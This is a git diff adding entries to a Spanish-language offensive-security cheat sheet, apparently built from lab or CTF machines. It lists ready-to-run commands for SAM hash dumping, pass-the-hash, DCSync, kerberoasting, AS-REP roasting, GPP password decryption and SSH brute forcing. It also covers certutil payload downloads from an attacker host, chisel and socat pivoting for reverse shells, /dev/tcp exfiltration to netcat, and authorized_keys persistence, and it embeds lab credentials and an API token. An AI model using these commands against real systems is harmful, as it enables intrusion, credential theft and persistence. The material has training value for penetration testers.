@@ -70,7 +70,7 @@ Herramienta: "GetADUsers"
 Descripcion: Enumeracion de usuarios
 Comando: GetADUsers.py-all <dominio>/user:password -dc-ip <ip>
 ------------------------------------------------------------------------------------------------------------------------------------
-Categoria: "Windows"
+Categoria: "Transferencia de archivos"
 Protocolo: "Comandos"
 Herramienta: "iwr" 
 Descripcion: Descargar un documento de otra computadora
@@ -459,8 +459,10 @@ Comando: locate .nse | xargs grep "categories" | grep -oP '".*?"' | sort -u
 Categoria: "Transferencia de archivos"
 Protocolo: "SSH"
 Herramienta: "scp"
-Descripcion: Copiar archivos de una maquina remota a una maqui local 
-Comando: scp user@10.10.10.10:/home/user/* .
+Descripcion: Copiar archivos mediante ssh
+Comando: 
+1. scp user@10.10.10.10:/home/user/* . (De una maquina remota a una local)
+2. scp file.txt root@10.10.10.10:/tmp/file.txt (De una maquina local a una remota)
 ------------------------------------------------------------------------------------------------------------------------------------
 Categoria: "SSH"
 Protocolo: "SSH"
@@ -566,6 +568,18 @@ Protocolo: "SMB"
 Herramienta: "crackmapexec"
 Descripcion: Paswword Spry
 Comando: crackmapexec smb 10.10.10.10 -u users.txt -p users.txt --continue-on-success
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Active Directory"
+Protocolo: "SMB"
+Herramienta: "crackmapexec"
+Descripcion: Dumpear hasesh
+Comando: crackmapexec smb 10.10.10.10 -u users -p password --sam
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Active Directory"
+Protocolo: "Winrm"
+Herramienta: "evil-winrm"
+Descripcion: Pass the hash con evil-winrm
+Comando: evil-winrm -i 10.10.110.58 -u 'p3rr1n' -H 'e45a314c664d40a227f9540121d1a29d'
 ------------------------------------------------------------------------------------------------------------------------------------
 Categoria: "Active Directory"
 Protocolo: "SMB"           
@@ -724,7 +738,7 @@ Comando:
 1. script /dev/null -c bash / python3 -c 'import pty;pty.spawn("/bin/sh")'
 2. CTRL + Z
 3. stty raw -echo; fg
-4. reset
+4. reset / reset xterm
 5. export TERM=xterm
 6. export SHELL=bash
 7. stty rows 40 columns 123
@@ -756,8 +770,20 @@ Comando:
 2) Configurar el archivo /etc/proxychains4.conf agregando:
 socks5 127.0.0.1 1080
 3) ./chisel client 10.10.14.12:1233 R:socks - Conectar el cliente al servidor (En la victima)
-4) Ejecutar cuaqluier comando a mi localhost ingresandp antes proxychains
+4) Ejecutar cuaqluier comando a la victima ingresando antes proxychains
 NOTA: Esto funsiona cuando queremos traer varios puertos al mismo tiempo y no uno por uno
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Pivoting"
+Protocolo: "TCP"
+Herramienta: "chisel"
+Descripcion: Doble Tuneling con chisel y proxychains
+Comando:
+1) ./chisel client 10.10.0.128:2232 R:8888:socks (En la maquina victima, colocarlo a la interfaz mas cercana)
+2) ./socat TCP-LISTEN:2232,fork TCP:192.168.27.128:1233 (En la maquina mas cercana, la maquina puente redirigir el trafico que le llegue por el puerto 2232 al puerto 1233 que es mi servidor de chisel en mi maquina de atacante)
+3) Configurar el archivo /etc/proxychains4.conf agregando:
+- Descomentar dynamic_chain y comentar strict_chain
+- socks5 127.0.0.1 8888 (Agregar la linea arriba del primer tunel)
+4) Ejecutar cuaqluier comando hacia la victima ingresando antes proxychains
 ------------------------------------------------------------------------------------------------------------------------------------
 Categoria: "SMB"
 Protocolo: "SMB"
@@ -1080,7 +1106,7 @@ Comando:
 ------------------------------------------------------------------------------------------------------------------------------------
 Categoria: "Active Directory"
 Protocolo: "SMB"
-Herramienta: "impacket"
+Herramienta: "psexec"
 Descripcion: Iniciar sesion por smb cuando marque un pwned
 Comando: impacket-psexec WORKGROUP/Administrator@10.10.110.213 cmd.exe
 ------------------------------------------------------------------------------------------------------------------------------------
@@ -1092,7 +1118,183 @@ Comando: sqsh -S 10.10.110.58 -U 'sa'
 ------------------------------------------------------------------------------------------------------------------------------------
 Categoria: "SQL"
 Protocolo: "SQL"
-Herramienta: "prueba"
-Descripcion: Conectarse con el servicio SQL
-Comando: sqsh -S 10.10.110.58 -U 'sa'
+Herramienta: "impacket"
+Descripcion: Conectarse con el servicio SQL mediante mssqliclient.py
+Comando: python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py WORKGROUP/sa:x5Chuz8XbM@10.10.110.58
 ------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Transferencia de archivos"
+Protocolo: "Windows"
+Herramienta: "certutil"
+Descripcion: Transferencia de archivos windows
+Comando: certutil.exe -f -urlcache -split http://10.10.14.38:8000/JuicyPotato.exe JuicyPotato.exe
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "WordPress"
+Protocolo: "WordPress"
+Herramienta: "wpscan"
+Descripcion: Enumeracion Wordpress via mas agresiva con api-token
+Comando: wpscan --url http://192.168.27.215/blog/ -e vt,tt,u,ap --plugins-detection aggressive --api-token=DB1eb8yjO7a4eLgUwlHqXZmyVssmwda8sG4pkQFrCWU
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "WordPress"
+Protocolo: "WordPress"
+Herramienta: "wordpress"
+Descripcion: Archivo de configuracion de wordpress donde generalmente se almacenan credenciales o info sensible
+Comando: wp-config.php
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Persistencia"
+Protocolo: "SSH"
+Herramienta: "ssh-keygen"
+Descripcion: Generar par de llaves ssh
+Comando: ssh-key gen
+NOTA: Una vez creada, la llave publica ~/.ssh/id_rsa.pub debe guardarse en el directorio /root/.ssh/ como authorized_keys
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Pivoting"
+Protocolo: "UDP"
+Herramienta: "chisel"
+Descripcion: Remote Port Forwarding con chisel meidante UDP
+Comando:
+1 ./chisel server --reverse -p 1233 (En mi host)
+2 ./chisel client 10.10.14.10:1233 R:80:172.19.0.2:80/udp (En el host remoto)
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Pivoting"
+Protocolo: "HTTP"
+Herramienta: "comandos"
+Descripcion: Transferencia de archivos
+Comando: 
+1. cat < file.txt > /dev/tcp/<IP_maquina_puente/4646
+2. ./socat TCP-LISTEN:4646,fork TCP:192.168.27.128:5656 (En maquina puente)
+3. nc -lvp 5656 > logins.json (En maquina atacante)
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Pivoting"
+Protocolo: "SSH"
+Herramienta: "scp"
+Descripcion: Transferencia de archivos mediante scp en tunneling
+Comando: 
+1. proxychains scp file root@10.10.0.129:/tmp/chisel
+NOTA: Se requiere haber generado un par de llaves e ingresar la llave publica en .ssh/authorized_keys
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "comandos"
+Protocolo: "comandos"
+Herramienta: "strace"
+Descripcion: Inspeccionar ejecutable linux
+Comando: strace ./ejecutable
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Pivoting"
+Protocolo: "TCP"
+Herramienta: "socat"
+Descripcion: Multiples redirecciones con socat
+Comando: Util cuando se necesite regresar una rev shell desde maquinas fuera de mi red (Siempre empezar a enviarlo al nodo mas cercano)
+1. ./socat TCP-LISTEN:5555,fork TCP:10.10.0.128:5556
+2. ./socat TCP-LISTEN:5556,fork TCP:192.168.27.128:443
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Pivoting"
+Protocolo: "TCP"
+Herramienta: "ping"
+Descripcion: Enumerar equipos en otras redes con ping y arp en Windows
+Comando: 
+1. for /L %a in (1,1,254) do @start /b ping 172.18.0.%a -w 100 -n 2 >nul
+2. arp -a (En la seccion de la interfaz que enumeramos veremos nuevos euqipos descubiertos)
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Brute Force"
+Protocolo: "ssh"
+Herramienta: "hydra"
+Descripcion: Ataque de fuerza bruta a ssh con hydra
+Comando: 
+hydra -l guest -P password.txt ssh://172.18.0.129 -t 20 2>/dev/null
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Active Directory"
+Protocolo: "Kerberos"
+Herramienta: "GetNPUsers"
+Descripcion: Ataque Asreproasting
+Comando:python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py htb.local/ -no-pass -usersfile users.txt -dc-ip 10.10.10.161
+NOTA: Para poder realizar este ataque unicamente se necesitan conocer usuarios pertenecientes al AD
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Active Directory"
+Protocolo: "SMB"
+Herramienta: "smbmap"
+Descripcion: Enumeracion de recursos compartidos con credenciales
+Comando: smbmap -H 10.10.10.161 -u 'svc-alfresco' -p 's3rvice' 
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Active Directory"
+Protocolo: "LDAP"
+Herramienta: "ldapdomain"
+Descripcion: Enumeracion de ldap 
+Comando: ldapdomaindump -u 'htb.local\svc-alfresco' -p 's3rvice' 10.10.10.161
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Active Directory"
+Protocolo: "SO"
+Herramienta: "bloodhound"
+Descripcion: Enumeracion del AD con bloodhound 
+Comando: Para iniciarlo
+1. neo4j console (neo4j:admin)
+2. bloodhound
+3. Transferir el archivo SharpHound.ps1 a la maquina victima y ejecutarlo con Invoke-Bloodhound -CollectionMethod All (Genera un zip que debe trasnferirse a la maquina de atacante y subirlo al bloodhound)
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Windows"
+Protocolo: "winrm"
+Herramienta: "evil-winrm"
+Descripcion: Descargar archivos con evil-winrm
+Comando: download C:\Users\svc-alfresco\desktop\20230628085842_BloodHound.zip data.zip
+NOTA: Agregar toda la ruta completa del archivo o marcara error
+----------------------------------------------------------------------------------------------------------------------------------- 
+Categoria: "Active Directory"
+Protocolo: "Windows"
+Herramienta: "bloodhound"
+Descripcion: Agregar usuarios al dominio
+Comando: net user p3rr1n admin123 /add net group "Exchange Windows Permissions" p3rr1n /add
+NOTA: Cuando el usuario comprometido forma parte del grupo Account operators tiene la capacidad de crear nuevos usuarios y agregarlos a nuevos grupos 
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Active Directory"
+Protocolo: "windows"
+Herramienta: "bloodhound"
+Descripcion: dcsync attack
+Comando:  
+1. $SecPassword = ConvertTo-SecureString 'Admin123.' -AsPLainText -Force 
+2. $Cred = New-Object System.Management.Automation.PSCredential('htb.local\srp3rr1n', $SecPassword)
+3. Cargar powerview.ps1 a la maquina victima
+4. Add-DomainObjectAcl -Credential $Cred -TargetIdentity htb.local -Rights DCSync
+5. /usr/share/doc/python3-impacket/examples/secretsdump.py srp3rr1n:Admin123@10.10.10.161 
+NOTA: Cuando el usuario comprometido forma parte del grupo Exchange Windows Permissions es posible relizar un ataque dcsync 
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Active Directory"
+Protocolo: "SMB"
+Herramienta: "gpp-decrypt"
+Descripcion: Descifrar contrasena cpassword
+Comando: gpp-decrypt 'dBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'
+NOTA: Comunmente en el recurso compartido SYSVOL se encuentra un archivo Groups.xml el cual contiene la contrasela cifrada del usuario
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Active Directory"
+Protocolo: "SMB"
+Herramienta: "mount"
+Descripcion: Crear una montura de un recurso compartido
+Comando: 
+1. mkdir /mnt/smbmounted
+2. mount -t cifs //10.10.10.100/Users /mnt/smbmounted -o username=SVC_TGS,password=GPPstillStandingStrong2k18,domain=active.htb,rw
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Active Directory"
+Protocolo: "Kerberos"
+Herramienta: "GetUserSPNs"
+Descripcion: Ataque kerberoasting (obtener un TGS)
+Comando:
+1. Comporbacion si el usuario es kerberoasteable -> /usr/share/doc/python3-impacket/examples/GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18
+2. Obtener el hash -> /usr/share/doc/python3-impacket/examples/GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 
+NOTA: Se requieren credenciales validas para efectuar el ataque
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Active Directory"
+Protocolo: "SMB"
+Herramienta: "smbmap"
+Descripcion: Enumeracion de recursos compartidos utilizando un null sesion
+Comando: smbmap -H 10.10.10.192 -u 'aaaa'
+NOTA: Util cuando ejeuctas smbmap sin credenciales pero no lista nada, al agregar la null session lista los recursos compartidos
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Active Directory"
+Protocolo: "Kerberos"
+Herramienta: "kerbrute"
+Descripcion: Enumeracion de usuarios validos en el AD
+Comando: ./kerbrute_linux_amd64 userenum --dc 10.10.10.192 -d blackfield.local users.txt
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Active Directory"
+Protocolo: "AD"
+Herramienta: "bloodhound"
+Descripcion: Ejecucion de bloodhound de forma remota con credenciales
+Comando: bloodhound-python -c all -u 'support' -p '#00^BlackKnight' -ns 10.10.10.192 -d blackfield.local
+
